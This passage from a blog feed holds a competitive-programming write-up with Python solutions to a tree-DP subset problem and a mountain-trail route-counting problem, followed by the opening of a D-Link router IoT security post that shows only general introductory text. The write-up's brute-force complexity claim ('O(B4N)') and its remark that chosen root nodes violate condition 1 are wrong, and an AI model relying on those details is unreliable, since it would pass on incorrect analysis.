<p>This problem is a tree problem. We are given a tree with <code>N</code> nodes, labeled 1 to <code>N</code>. We are also given 2 vectors: <code>p</code> and <code>v</code>. <code>p</code> holds the parent node of each node, with <code>p[i] = 0</code> being the root node. <code>v</code> holds the integer value of each node.</p>
<p>For example: Given <code>N = 6</code>, <code>p = [0, 1, 1, 3, 3, 3]</code>, and <code>v = [30, 15, 10, 20, 15, 18]</code>, we can draw this tree out:</p>

    <img src="/img/lge-dreamcode-writeup/example-tree.png"  alt="Example tree"  class="center"  style="padding: 10px"  />


<p>For a node-subset <code>S</code> to be a &ldquo;good&rdquo; node-subset, it needs to satisfies these 2 conditions:</p>
<ol>
<li>If a node is in <code>S</code>, its parents and children node cannot be in <code>S</code>.</li>
<li>If a non-leaf node is not in <code>S</code>, at least 1 of its children must be in <code>S</code>.</li>
</ol>
<p>So for our above example tree, The following node-subsets are &ldquo;good&rdquo;:</p>
<ul>
<li><code>S = [3]</code></li>
<li><code>S = [1, 4, 6]</code></li>
<li><code>S = [1, 4]</code></li>
<li><code>S = [2, 3]</code></li>
</ul>
<p>Below is a sample input for this problem:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>5
</span></span><span style="display:flex;"><span>6
</span></span><span style="display:flex;"><span>30 15 10 20 15 18
</span></span><span style="display:flex;"><span>0 1 1 3 3 3
</span></span><span style="display:flex;"><span>6
</span></span><span style="display:flex;"><span>1 120 100 10 20 30
</span></span><span style="display:flex;"><span>0 1 1 3 3 3
</span></span><span style="display:flex;"><span>6
</span></span><span style="display:flex;"><span>100 8 5 -20 -30 15
</span></span><span style="display:flex;"><span>0 1 1 3 3 3
</span></span><span style="display:flex;"><span>5
</span></span><span style="display:flex;"><span>-1 -2 -3 -4 -5
</span></span><span style="display:flex;"><span>2 3 4 5 0
</span></span><span style="display:flex;"><span>2
</span></span><span style="display:flex;"><span>-2022 2022
</span></span><span style="display:flex;"><span>0 1
</span></span></code></pre></div><p>The first line of the input is the test case <code>T</code>. Each test case has 3 lines. The first line of the test case is the number of nodes in the tree <code>N</code>. The second line is the <code>v</code> array with the integer values for each node. The third line is the <code>p</code> array, indicating the structure of the tree.</p>
<p>The objective here is for us to find the &ldquo;good&rdquo; node-subset that yields the highest sum value of each node in the node-subset. For example, in our above example tree, <code>S = [1, 4, 5, 6]</code> yields the highest sum value, 83, out of all the &ldquo;good&rdquo; node-subsets for that tree.</p>
<p>Firstly, we need to read the data into our program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">=</span> iter(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    T <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(T):
</span></span><span style="display:flex;"><span>        N <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>        v <span style="color:#f92672">=</span> [int(next(it)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(N)]
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> [int(next(it)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(N)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(solve(N, v, p))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Let&rsquo;s do the same thing, we check the brute-force approach, then check the DP approach. Let&rsquo;s see the <code>solve()</code> function for the brute-force approach:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_tree</span>(num_nodes, parents):
</span></span><span style="display:flex;"><span>    tree_list <span style="color:#f92672">=</span> [[] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># build tree list based on parents array</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes):
</span></span><span style="display:flex;"><span>        par <span style="color:#f92672">=</span> parents[i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> par <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            tree_list[par <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> tree_list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(num_nodes, vals, parents):
</span></span><span style="display:flex;"><span>    tree_list <span style="color:#f92672">=</span> build_tree(num_nodes, parents)
</span></span><span style="display:flex;"><span>    best <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10</span><span style="color:#f92672">**</span><span style="color:#ae81ff">42</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># bitmask for choosing nodes</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> mask <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> num_nodes):
</span></span><span style="display:flex;"><span>        chosen <span style="color:#f92672">=</span> [(mask <span style="color:#f92672">&gt;&gt;</span> i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes)]
</span></span><span style="display:flex;"><span>        valid <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># condition 1: no adjacent nodes chosen</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> chosen[i]:
</span></span><span style="display:flex;"><span>                par <span style="color:#f92672">=</span> parents[i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># node is not root node and its parent node is chosen</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> par <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> chosen[par <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]:
</span></span><span style="display:flex;"><span>                    valid <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> valid:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># condition 2: every unchosen node has at least 1 chosen child</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># node is not chosen and node is not leaf node</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> chosen[i] <span style="color:#f92672">and</span> tree_list[i]:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># if none of the node&#39;s children are chosen</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> any(chosen[j] <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> tree_list[i]):
</span></span><span style="display:flex;"><span>                    valid <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> valid:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># calc score of valid subset</span>
</span></span><span style="display:flex;"><span>        total <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> chosen[i]:
</span></span><span style="display:flex;"><span>                total <span style="color:#f92672">+=</span> vals[i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        best <span style="color:#f92672">=</span> max(best, total)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> best
</span></span></code></pre></div><p>Because this is a tree problem, I converted the input into an adjacency list representation for ease of processing. I used a bitmask with <code>N</code> bits for choosing the node and turned the mask into a binary array with the length <code>N</code>. This mask means we try every possible combinations of node-subset possible. <code>valid</code> will hold the status of the subset.</p>
<p>There are 2 conditions that we need to check here. Let&rsquo;s go through each of the condition check:</p>
<ul>
<li>Condition 1: For each chosen node, root nodes and nodes whose parent is also chosen violates condition 1.</li>
<li>Condition 2: For each non-chosen non-leaf node, we check if none of its children are in the chosen array. If yes then it violates condition 2.</li>
</ul>
<p>Finally, we calculate the score of the node-subset with <code>best</code> as the placeholder value. This approach is very slow, we used 3 loops, each with <code>O(N)</code> as the worst case scenario. Not to mention our bitmask enumeration loop too, which has a time complexity of <code>O(B)</code>, with <code>B</code> being the number of bits in <code>N</code>. The <code>build_tree()</code> function also has a time complexity of <code>O(N)</code> too. So the time complexity of this algorithm as a whole is <code>O(B4N)</code>. This is inefficent and it did not meet the time limit.</p>
<p>Let&rsquo;s move onto the DP approach:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> collections <span style="color:#f92672">import</span> defaultdict
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(num_nodes, vals, parents):
</span></span><span style="display:flex;"><span>    tree <span style="color:#f92672">=</span> defaultdict(list)
</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> parents[i] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            root <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            tree[parents[i] <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>append(i)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># dp[node][0]: not selected, dp[node][1]: selected</span>
</span></span><span style="display:flex;"><span>    dp <span style="color:#f92672">=</span> [[<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(num_nodes)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dfs</span>(node):
</span></span><span style="display:flex;"><span>        total_when_not_taken <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        gain_if_take <span style="color:#f92672">=</span> vals[node] <span style="color:#75715e"># if take node, can&#39;t take its children</span>
</span></span><span style="display:flex;"><span>        child_selected_at_least_once <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>        max_child_diff <span style="color:#f92672">=</span> float(<span style="color:#e6db74">&#39;-inf&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> v <span style="color:#f92672">in</span> tree[node]:
</span></span><span style="display:flex;"><span>            dfs(v)
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># if take node, can&#39;t take its children</span>
</span></span><span style="display:flex;"><span>            gain_if_take <span style="color:#f92672">+=</span> dp[v][<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># if don&#39;t take node, children can be taken (or no)</span>
</span></span><span style="display:flex;"><span>            total_when_not_taken <span style="color:#f92672">+=</span> max(dp[v][<span style="color:#ae81ff">0</span>], dp[v][<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> dp[v][<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;</span> dp[v][<span style="color:#ae81ff">0</span>]:
</span></span><span style="display:flex;"><span>                child_selected_at_least_once <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>            max_child_diff <span style="color:#f92672">=</span> max(max_child_diff, dp[v][<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> dp[v][<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># if node not taken and none of its children are taken, must take at least one</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> child_selected_at_least_once <span style="color:#f92672">and</span> tree[node]:
</span></span><span style="display:flex;"><span>            total_when_not_taken <span style="color:#f92672">+=</span> max_child_diff
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dp[node][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> total_when_not_taken
</span></span><span style="display:flex;"><span>        dp[node][<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> gain_if_take
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    dfs(root)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> max(dp[root][<span style="color:#ae81ff">0</span>], dp[root][<span style="color:#ae81ff">1</span>])
</span></span></code></pre></div><p>This is also a 2-state DP approach. I ended up switching to building my adjacency list representation with <code>defaultdict</code> since it&rsquo;s easier to build a DFS algorithm for this. We also initialize a <code>dp</code> table for each node. The 2 states in this table represents the total of the subset when not selecting and selecting the node, respectively.</p>
<p>Next, we do a post-order DFS. For each node, we recurse on all children <code>v</code>, so that <code>dp[v][0]</code> and <code>dp[v][1]</code> are computed before combining at <code>dp[node]</code>. After we visited all the child nodes, we set <code>dp[node][0]</code> and <code>dp[node][1]</code>. The final result will be stored in <code>dp[root]</code>.</p>
<p>Within the DFS, if we take a particular node (<code>dp[node][1]</code>), we can&rsquo;t take its children anymore. So we can only select <code>dp[v][0]</code>, which is the &ldquo;not select&rdquo; state for the child node. <code>gain_if_take</code> holds the current node&rsquo;s value plus the sum of its children in the &ldquo;not select&rdquo; state. If we don&rsquo;t take a particular node (<code>dp[node][0]</code>), we have to take at least 1 of its children. We can optionally select the child nodes or not, depending on which option yields the highest result and this is summed into <code>total_when_not_taken</code>. However, we need to ensure that we&rsquo;ll select <strong>at least</strong> 1 child node, which is expressed through the comparison <code>dp[v][1] &gt; dp[v][0]</code> for some child nodes. If none of the child node is selected, we have to force select one. To minimize the loss of gain in this case, we pick the child node with the highest <code>dp[v][1] - dp[v][0]</code> and track it in <code>max_child_diff</code>. Because <code>dp[v][1]</code> and <code>dp[v][0]</code> holds the cummulative value of the calculation up to that node, taking the difference between the 2 give us the value of the child node that is force selected.</p>
<p>After we finish looping through the child nodes, if the current node is not taken and none of its child nodes are chosen, we force select a child by adding <code>max_child_diff</code>. If the node is a leaf node, we don&rsquo;t have to add anything.</p>
<p>Finally, the final score is stored in the root node states, so we just take it directly from there and return it. This 2-state DFS DP algorithm will visit each node exactly once so the time complexity for this is linear (<code>O(N)</code>).</p>
<h2 id="4th-problem-hiking">4th problem: Hiking</h2>
<p>This is a graph problem. My (definitely not) favorite type of problems.</p>
<p>We are given 2 mountains: Mt. East and Mt. West, which I&rsquo;ll just call East and West. East has <code>n</code> trails, the lengths of which are stored in an array called <code>A</code>. West has <code>m</code> trails, the lengths of which are stored in an array called <code>B</code>. Each trail begins and end at the same place, the entrance of its mountain. The entrances of the 2 mountains are connected by a bridge with the length of <code>x</code>.</p>
<p>Below is an example of a map of the 2 mountains with its trails and the bridge. The square indicates the entrance of East and the circle indicates the entrance of West.</p>

    <img src="/img/lge-dreamcode-writeup/example-mountain-trails.png"  alt="Example mountain trails"  class="center"  style="padding: 10px"  />


<p>A hiking route needs to satisfy these conditions:</p>
<ul>
<li>The route&rsquo;s length must be at least <code>C</code> and at most <code>D</code> long.</li>
<li>The same trail can&rsquo;t be used more than once.</li>
<li>The trails of the same mountain can&rsquo;t be used back-to-back. We must alternate between the 2 mountains.</li>
<li>The bridge is the only way to move between mountains and it can be used multiple times.</li>
<li>We can&rsquo;t start or end on the bridge.</li>
<li>When we use the bridge, we can&rsquo;t use it again unless we&rsquo;ve hiked through a trail first. Hence, when the bridge is used, it must be used before or after using a trail from either mountain.</li>
</ul>
<p>In the above example, we have these information about the map: <code>n = m = 2</code>, <code>x = 10</code>, <code>A = [40, 45]</code>, <code>B = [42, 42]</code>, <code>C = 1</code>, <code>D = 100</code>. In total, there are 12 possible hiking routes within the specified range:</p>
<ul>
<li>4 routes which has the length of 40 or 45 (using the trail once then ending the hike).</li>
<li>8 routes which has the length of 92 or 97 (using 1 trail from 1 mountain, then move through the bridge, then use 1 more trail from the other mountain, then end the hike).</li>
</ul>
<p>Our objective is to find the number of hiking routes that can be taken within the specified length range given a map. Below is the example input for our program.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>3
</span></span><span style="display:flex;"><span>3 5 100 245 245
</span></span><span style="display:flex;"><span>10 20 30
</span></span><span style="display:flex;"><span>1 2 3 4 5
</span></span><span style="display:flex;"><span>5 5 1 39 39
</span></span><span style="display:flex;"><span>1 2 3 4 5
</span></span><span style="display:flex;"><span>5 4 3 2 1
</span></span><span style="display:flex;"><span>5 5 1 1 3
</span></span><span style="display:flex;"><span>1 1 1 1 1
</span></span><span style="display:flex;"><span>1 1 1 1 1
</span></span></code></pre></div><p>First, as always, we have the number of test cases <code>T</code>. Each test cases have 3 lines. The first line of a test case include <code>n</code>, <code>m</code>, <code>x</code>, <code>C</code>, and <code>D</code>, respectively. The second line is the <code>A</code> array and the third line is the <code>B</code> array.</p>
<p>Firstly, we need to read the data into our program:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    it <span style="color:#f92672">=</span> iter(data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    T <span style="color:#f92672">=</span> int(next(it))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(T):
</span></span><span style="display:flex;"><span>        n, m, x, C, D <span style="color:#f92672">=</span> [int(next(it)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>)]
</span></span><span style="display:flex;"><span>        A <span style="color:#f92672">=</span> [int(next(it)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n)]
</span></span><span style="display:flex;"><span>        B <span style="color:#f92672">=</span> [int(next(it)) <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(m)]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        print(solve(n, m, x, C, D, A, B))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>Below is my alternating DFS approach to this problem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> functools <span style="color:#f92672">import</span> cache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve</span>(n, m, x, C, D, A, B):
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@cache</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dfs_from_A</span>(used_A, used_B, total_len):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> total_len <span style="color:#f92672">&gt;</span> D:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># prune</span>
</span></span><span style="display:flex;"><span>        count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">if</span> C <span style="color:#f92672">&lt;=</span> total_len <span style="color:#f92672">&lt;=</span> D <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># next is B</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(m):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (used_B <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i)):
</span></span><span style="display:flex;"><span>                new_length <span style="color:#f92672">=</span> total_len <span style="color:#f92672">+</span> x <span style="color:#f92672">+</span> B[i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> new_length <span style="color:#f92672">&lt;=</span> D:
</span></span><span style="display:flex;"><span>                    count <span style="color:#f92672">+=</span> dfs_from_B(used_A, used_B <span style="color:#f92672">|</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i), new_length)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> count
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@cache</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dfs_from_B</span>(used_A, used_B, total_len):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> total_len <span style="color:#f92672">&gt;</span> D:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span> <span style="color:#75715e"># prune</span>
</span></span><span style="display:flex;"><span>        count <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">if</span> C <span style="color:#f92672">&lt;=</span> total_len <span style="color:#f92672">&lt;=</span> D <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># next is A</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (used_A <span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i)):
</span></span><span style="display:flex;"><span>                new_length <span style="color:#f92672">=</span> total_len <span style="color:#f92672">+</span> x <span style="color:#f92672">+</span> A[i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> new_length <span style="color:#f92672">&lt;=</span> D:
</span></span><span style="display:flex;"><span>                    count <span style="color:#f92672">+=</span> dfs_from_A(used_A <span style="color:#f92672">|</span> (<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i), used_B, new_length)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> count
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    num_routes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
</span></span><span style="display:flex;"><span>        num_routes <span style="color:#f92672">+=</span> dfs_from_A(<span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i, <span style="color:#ae81ff">0</span>, A[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(m):
</span></span><span style="display:flex;"><span>        num_routes <span style="color:#f92672">+=</span> dfs_from_B(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> i, B[i])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> num_routes
</span></span></code></pre></div><p>The problem requires us to alternate between the 2 mountains so I implemented this alternating DFS approach. <code>used_A</code> and <code>used_B</code> are bitmasks that indicates which indices of <code>A</code> and <code>B</code> have already been used in the current route.</p>
<p>For each DFS, we first check if the length of the route is longer than <code>D</code>, if yes then we prune the search branch and return 0 immediately. We set <code>count</code> to 1 if the current partial route is within the <code>C</code> and <code>D</code> range, else we set it to 0.</p>
<p>We loop over the unused trails in the list and calculate the new length with an unused trail. If the new length fits within the range, we call the other DFS function and continue until we run out of trails or we found a route that fits within the range.</p>
<p>Finally, we start the algorithm by working through each route in both <code>A</code> and <code>B</code>, hence the 2 loops at the end of the <code>solve()</code> function. The <code>@cache</code> directive is used to memoize the recursive calls and speed the program up. Although this solution works on the example inputs, it ultimately did not meet the time limit requirement.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I had a lot of fun in this competition as I got to exercise my coding and problem solving skill. Although I didn&rsquo;t make it to the top 50, I&rsquo;m still quite happy with my performance. I hope you enjoyed reading my approaches to these 4 problems.</p>
<p>If you want to get into competitive programming, I&rsquo;d suggest you start practicing on <a href="https://codeforces.com/">Codeforces</a> and read the <a href="https://cses.fi/book/book.pdf">Competitive Programmer&rsquo;s Handbook</a>.</p>
]]></content>
        </item>
        
        <item>
            <title>IoT Security Analysis: D-Link DIR-820L Router</title>
            <link>https://namberino.github.io/posts/2025/05/iot-security-analysis-d-link-dir-820l-router/</link>
            <pubDate>Sat, 31 May 2025 15:22:55 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2025/05/iot-security-analysis-d-link-dir-820l-router/</guid>
            <description>&lt;h2 id=&#34;the-importance-of-iot-security&#34;&gt;The importance of IoT security&lt;/h2&gt;

    &lt;img src=&#34;https://namberino.github.io/img/dir820l-security/iot-growth-graph.png&#34;  alt=&#34;IoT Growth Graph&#34;  class=&#34;center&#34;  style=&#34;padding: 10px&#34;  /&gt;


&lt;p&gt;The number of IoT devices in the world has been growing significantly. As more and more devices come online, the more security risks there is. And as we all know, the &amp;ldquo;S&amp;rdquo; in &amp;ldquo;IoT&amp;rdquo; stands for Security.&lt;/p&gt;
&lt;p&gt;The need for security in the IoT sector is growing along with the growth of IoT. Security within IoT is important as there&amp;rsquo;s much bigger consequences if a critical IoT device is hacked compared to a website being hacked. If some IoT devices that&amp;rsquo;s being used for critical purposes such as health monitoring or ICS operation, compromise of such systems could lead to devastating physical consequences. In the worst case, it could endanger human life.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="the-importance-of-iot-security">The importance of IoT security</h2>

    <img src="/img/dir820l-security/iot-growth-graph.png"  alt="IoT Growth Graph"  class="center"  style="padding: 10px"  />


<p>The number of IoT devices in the world has been growing significantly. As more and more devices come online, the more security risks there is. And as we all know, the &ldquo;S&rdquo; in &ldquo;IoT&rdquo; stands for Security.</p>
